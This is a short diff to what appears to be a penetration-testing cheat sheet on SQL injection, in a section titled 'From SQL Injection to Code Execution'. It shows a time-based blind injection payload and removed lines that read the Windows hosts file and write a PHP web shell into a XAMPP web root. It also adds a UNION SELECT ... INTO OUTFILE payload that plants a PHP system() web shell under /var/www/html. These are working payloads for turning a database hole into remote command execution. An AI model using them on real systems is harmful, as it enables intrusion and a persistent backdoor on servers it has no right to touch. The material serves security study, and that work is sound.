@@ -26,8 +26,7 @@ offsec' AND IF (1=1, sleep(3),'false') -- //
 
 ###### From SQL Injection to Code Execution
 ```
-http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
-http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 ```
 ### MSSQL Injection
 ###### Summary
